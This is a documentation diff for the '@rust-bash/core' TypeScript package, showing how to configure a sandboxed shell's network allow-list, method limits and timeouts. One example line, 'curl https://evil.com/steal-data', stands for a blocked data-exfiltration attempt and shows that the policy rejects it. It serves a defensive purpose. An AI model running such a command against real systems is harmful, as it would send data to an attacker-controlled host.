@@ -138,3 +138,47 @@ let broad = NetworkPolicy {
     ..Default::default()
 };
 ```
+
+---
+
+## TypeScript: Network Configuration
+
+The `@rust-bash/core` npm package supports the same network policy:
+
+```typescript
+import { Bash } from '@rust-bash/core';
+
+const bash = await Bash.create(createBackend, {
+  network: {
+    enabled: true,
+    allowedUrlPrefixes: [
+      'https://api.example.com/',
+      'https://httpbin.org/',
+    ],
+    allowedMethods: ['GET', 'POST'],
+    maxResponseSize: 10 * 1024 * 1024, // 10 MB
+    maxRedirects: 5,
+    timeoutSecs: 30,
+  },
+});
+
+// Allowed — matches a prefix
+await bash.exec('curl https://api.example.com/v1/users');
+
+// Blocked — no matching prefix
+const result = await bash.exec('curl https://evil.com/steal-data');
+console.log(result.exitCode); // non-zero
+```
+
+### NetworkConfig Fields (TypeScript)
+
+| Field | Type | Default | Description |
+|-------|------|---------|-------------|
+| `enabled` | `boolean` | `false` | Master switch for network access |
+| `allowedUrlPrefixes` | `string[]` | `[]` | URLs must start with one of these |
+| `allowedMethods` | `string[]` | `['GET', 'POST']` | Allowed HTTP methods |
+| `maxResponseSize` | `number` | `10485760` | Max response body size in bytes |
+| `maxRedirects` | `number` | `5` | Max redirect follows |
+| `timeoutSecs` | `number` | `30` | Per-request timeout in seconds |
+
+> **Note:** Network access is only available when using the native addon backend on Node.js. The WASM backend in browsers does not support `curl`.
